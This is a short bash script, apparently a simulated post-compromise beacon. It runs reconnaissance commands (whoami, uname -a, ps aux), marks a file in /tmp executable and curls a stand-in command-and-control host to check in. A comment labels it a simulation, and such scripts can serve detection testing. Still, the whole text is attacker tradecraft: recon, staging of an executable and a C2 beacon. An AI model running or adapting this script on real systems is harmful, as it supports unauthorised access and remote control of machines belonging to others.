#!/bin/bash

whoami
uname -a
ps aux | head -n 5

chmod +x /tmp/update_cache.sh

echo "[*] Attempting beacon connection..."
# Simulating a call to a command and control server
curl -s http://malicious-command-and-control-server.com/checkin
